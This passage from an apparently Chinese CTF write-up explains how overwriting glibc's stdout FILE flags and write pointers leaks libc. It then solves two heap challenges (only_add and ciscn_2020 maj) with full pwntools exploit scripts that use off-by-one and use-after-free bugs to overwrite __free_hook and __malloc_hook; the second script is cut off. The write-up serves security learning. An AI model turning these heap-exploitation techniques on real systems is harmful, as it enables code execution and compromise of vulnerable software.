<span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们想要执行的是<code>_IO_new_do_write</code>，这就需要：</p>
<ul>
<li>f-&gt;_flags &amp; _IO_NO_WRITES 为0</li>
<li>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL 为0，也就是f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 1</li>
</ul>
<p><code>_IO_new_do_write</code> 函数的参数为：stdout 结构体、<code>_IO_write_base</code> 和 size（由 <code>f-&gt;_IO_wirte_ptr - f-&gt;_IO_write_base</code>产生）</p>
<p>而<code>_IO_new_do_write</code>调用<code>new_do_write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (fp, data, to_do)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span> || new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">new_do_write (fp, data, to_do)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *data;</span><br><span class="line">     _IO_size_t to_do;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       is not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_IO_SYSWRITE </code>就是最重要调用的函数，可理解为 <code>write(fp, data, to_do)</code></p>
<p>这里我们可以设置<code>_IO_IS_APPENDING</code>为1， 或者设置<code>fd-&gt;_IO_read_end == fd-&gt;_IO_write_base</code>，否则就不会有输出。</p>
<p>但是设置 <code>fp-&gt;_IO_write_base = fp-&gt;_IO_read_end</code> 的话，会在其他函数中产生错误，因为<code>fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end</code>。</p>
<p>因此，flag需要设置为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags &amp;= ~_IO_NO_WRITES <span class="comment">## _flags = 0xfbad0000 </span></span><br><span class="line">_flags |= _IO_CURRENTLY_PUTTING <span class="comment">## _flags = 0xfbad0800</span></span><br><span class="line">_flags |= _IO_IS_APPENDING <span class="comment">## _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>

<p>所以，通常将 stdout 的 flags 修改成 <strong>0xfbad18000</strong>，将 <code>_IO_write_base</code> 改小，就可以在成 Libc 的泄露。</p>
<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>综合之前对puts函数的分析和 _IO_FILE的结构体。</p>
<p>payload通常为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p64(0xfbad2887 | 0x1000) + p64(0) * 3 + b&quot;\x00&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">char *_IO_read_ptr; <span class="comment">#0</span></span><br><span class="line">   char *_IO_read_end;<span class="comment">#0</span></span><br><span class="line">   char *_IO_read_base;<span class="comment">#0</span></span><br><span class="line">   char *_IO_write_base;<span class="comment">#最后两位为0</span></span><br></pre></td></tr></table></figure>

<h1 id="两个例子"><a href="#两个例子" class="headerlink" title="两个例子"></a>两个例子</h1><h2 id="湘湖杯-only-add"><a href="#湘湖杯-only-add" class="headerlink" title="湘湖杯 only_add"></a>湘湖杯 only_add</h2><p>环境：Ubuntu 18.04</p>
<p>检查保护，保护全开。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201100214280.png" alt="image-20210201100214280"></p>
<p>ida反编译，发现只有基于realloc实现的add，存在一个offbyone漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201100253128.png" alt="image-20210201100253128"></p>
<p>退出是将buf重置，把输出流关掉。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201100508054.png" alt="image-20210201100508054"></p>
<p>首先关于<code>realloc</code>函数：</p>
<ul>
<li><p><code>realloc</code>（0）相当于free。</p>
</li>
<li><p>当<code>realloc</code>的<code>size</code>小于原有的<code>size</code>的时候会对原有的<code>chunk</code>进行切割，并将切割后的部分做一个类似于<code>free</code>的操作。</p>
</li>
<li><p>当size大于原有的，先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回。如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域</p>
</li>
</ul>
<p>由于没有输出函数，所以首先需要通过覆盖stdout来泄露libc。</p>
<p>首先需要将tcache填满：</p>
<p>首先申请一个0x500，然后申请一个小的size（比如0x90），只要0x500-size&gt;0x410，就不会进入tacache，与top chunk合并。之后再<code>realloc</code>（0），这样tcache就填充一个size大小的chunk。重复8次，就可以得到一个包含有<code>main_arena</code>附近地址的<code>chunk</code>。</p>
<p>for i in range(6):<br>            add(malloc_size)<br>            add(0x80)<br>            delete()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0xa8</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">delete()</span><br><span class="line">add(malloc_size)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;free unsorted bin chunk&quot;</span>)</span><br><span class="line">add(<span class="number">0x3c0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201102113750.png" alt="image-20210201102113750"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#off by one ==&gt; 0x90+0x30+0x30=0xf0 修改其为0xf0大小，刚好会与后俩个0x30大小的chunk重叠，然后修改后的0xf0大小的chunk从0x90大小的chunk申请回来，再释放，这样就会进入0xf0大小的chunk里，0x30的chunk仍在tcache里。</span></span><br><span class="line">add(<span class="number">0xa8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0xa8</span> + <span class="string">b&quot;\xf1&quot;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x88</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201102447003.png" alt="image-20210201102447003"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将之前在tcache bin 中0x30的chunk的指针指向unsorted bin 中的chunk</span></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\xe0&quot;</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201102650342.png" alt="image-20210201102650342"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将0x50 chunk后面的0x30chunk的size修改为0xc1，使其和unsorted bin中的chunk形成堆重叠，然后将其free掉</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + <span class="string">b&quot;\xc1&quot;</span>)</span><br><span class="line">delete()</span><br><span class="line"><span class="comment">#然后再次申请回来后，修改unsorted bin 中chunk的fd后四个字节为_IO_2_1_stdout_，这里倒数第四位需要爆破，1/16的机会。</span></span><br><span class="line">stdout=<span class="number">0xa760</span></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0xb8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + p64(<span class="number">0x91</span>) + p16(stdout))</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201103600747.png" alt="image-20210201103600747"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#申请chunk拿到_IO_2_1_stdout_,修改，得到libc</span></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>), timeout=<span class="number">1</span>)</span><br><span class="line">p.recv(<span class="number">0x18</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) + <span class="number">0x60</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br></pre></td></tr></table></figure>

<p>然后先调用close函数清掉buf缓冲区，IO那个fake chunk不满足free的要求。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">close_stdout()</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Bye&quot;</span>)</span><br><span class="line"><span class="comment">#堆重叠修改free hook</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x61</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x18</span>) + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">add_without(<span class="number">0xe8</span>, payload)</span><br><span class="line">delete_without()</span><br><span class="line">add_without(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete_without()</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭了标准输出，重定位</span></span><br><span class="line">payload2 = <span class="string">b&quot;cat flag 1&gt;&amp;2&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">add_without(<span class="number">0x38</span>, payload2)</span><br><span class="line"></span><br><span class="line">delete_without()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./babyheap&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(0xB1B)&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">20030</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content=<span class="string">b&quot;\n&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_without</span>(<span class="params">size, content=<span class="string">b&quot;\n&quot;</span></span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_without</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_stdout</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0xa760</span></span><br><span class="line">malloc_size = <span class="number">0x4f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            add(malloc_size)</span><br><span class="line">            add(<span class="number">0x80</span>)</span><br><span class="line">            delete()</span><br><span class="line"></span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0xa8</span>)</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0x80</span>)</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0x48</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(malloc_size)</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">&quot;free unsorted bin chunk&quot;</span>)</span><br><span class="line">        add(<span class="number">0x3c0</span>)</span><br><span class="line">        add(<span class="number">0x80</span>)</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0xa8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0xa8</span> + <span class="string">b&quot;\xf1&quot;</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0xe8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\xe0&quot;</span>)</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x48</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + <span class="string">b&quot;\xc1&quot;</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0xb8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x28</span> + p64(<span class="number">0x91</span>) + p16(stdout))</span><br><span class="line">        delete()</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0xe8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x28</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x28</span>, p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(p64(<span class="number">0xfbad2887</span> | <span class="number">0x1000</span>), timeout=<span class="number">1</span>)</span><br><span class="line">        p.recv(<span class="number">0x18</span>)</span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) + <span class="number">0x60</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">        log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;\x7f&quot;</span> <span class="keyword">in</span> p64(libc.address):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            p = process([file_path])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">20030</span>)</span><br><span class="line"></span><br><span class="line">close_stdout()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Bye\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x98</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x61</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x18</span>) + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">add_without(<span class="number">0xe8</span>, payload)</span><br><span class="line">delete_without()</span><br><span class="line">add_without(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete_without()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;cat flag 1&gt;&amp;2&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">add_without(<span class="number">0x38</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete_without()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2020-maj"><a href="#ciscn-2020-maj" class="headerlink" title="ciscn_2020 maj"></a>ciscn_2020 maj</h2><p>检查保护</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201104820608.png" alt="image-20210201104820608"></p>
<p>ida反编译，是一个堆题。</p>
<p>但是在add之前，需要回答一个问题。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201105000903.png" alt="image-20210201105000903"></p>
<p>发现了一系列不知道在干嘛的东西。看看了，发现对程序似乎并没有什么影响。真正的问题是这个：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201105111951.png" alt="image-20210201105111951"></p>
<p>顺着分支分析，可以知道80、81、82都可以通过。当然，也可以用爆破。</p>
<p>在free函数中，发现了存在UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201105220828.png" alt="image-20210201105220828"></p>
<p>之后的change函数正常，而show函数并没有实现。</p>
<p>所以这道题和上一道一样，首先需要通过覆盖stdout来泄露libc。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0xe0</span>, <span class="string">&#x27;0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;3&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;4&#x27;</span>)<span class="comment">#分割0</span></span><br><span class="line"><span class="comment">#指向IO_2_1_stderr_+157 </span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#2指向0</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210201110230844.png" alt="image-20210201110230844"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改std，泄露libc</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#和上面修改std类似的修改malloc_hook位onegadget</span></span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(fake_chunk))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">&#x27;11&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(gadget)</span><br><span class="line">new(<span class="number">0x60</span>, payload)</span><br><span class="line">edit(<span class="number">12</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;please answer the question\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">80</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;______?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn8&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x4024C8\n&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">20034</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;please answer the question\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">81</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;______?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;start_the_game,yes_or_no?&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; 